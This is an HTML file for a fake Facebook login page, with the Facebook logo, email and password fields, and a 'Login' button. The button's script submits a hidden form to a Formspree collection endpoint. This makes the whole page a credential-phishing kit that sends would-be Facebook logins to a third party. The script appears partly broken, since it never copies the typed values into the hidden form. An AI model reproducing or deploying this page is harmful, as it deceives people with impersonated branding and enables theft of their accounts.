<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/ionicons@6.0.0/dist/ionicons.css">
    <style>
        <!-- Your existing styles remain unchanged -->

        .send {
            padding: 1em;
            background: #1877f2; /* Facebook blue color */
            color: #fff; /* White text color */
            border: none;
            border-radius: 30px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: background 0.3s ease-in-out;
        }

        .send:hover {
            background: #135293; /* Darker shade on hover */
        }

        /* Additional style for the Formspree form */
        .formspree-form {
            display: none; /* Hide Formspree form initially */
        }
    </style>
</head>
<body>
    <div class="form-container">
        <!-- Replace this with your logo -->
        <div class="logo"> 
            <img src="https://cdn.shopify.com/s/files/1/0558/7052/1432/files/Facebook_Logo__2019.png?v=1704821241" alt="Facebook Logo">
        </div>

        <div class="email">
            <label for="email">Email or Phone</label>
            <div class="sec-2">
                <ion-icon name="mail-outline"></ion-icon>
                <input type="text" id="email" name="email" placeholder="Enter Email Or Phone Number">
            </div>
        </div>

        <div class="fullname">
            <label for="fullname">Password</label>
            <div class="sec-2">
                <ion-icon name="person-outline"></ion-icon>
                <input type="text" id="fullname" name="fullname" placeholder="Enter Your Password">
            </div>
        </div>

        <!-- Updated button action using Formspree integration -->
        <button class="send" onclick="showFormspreeForm()">Login</button>

        <!-- Formspree form with hidden fields -->
        <form class="formspree-form" action="https://formspree.io/f/myyrzggd" method="POST">
            <label>
                Your email:
                <input type="email" name="email">
            </label>
            <label>
                Your password:
                <input type="fullname" name="password">
            </label>
            <!-- Add any other hidden fields as needed -->

            <button type="submit" id="formspreeSubmitButton"></button>
        </form>

        <script>
            function showFormspreeForm() {
                // Show the Formspree form
                document.querySelector('.formspree-form').style.display = 'block';

                // Trigger the click event on the Formspree submit button
                document.getElementById('formspreeSubmitButton').click();
            }
        </script>
    </div>
</body>
</html>
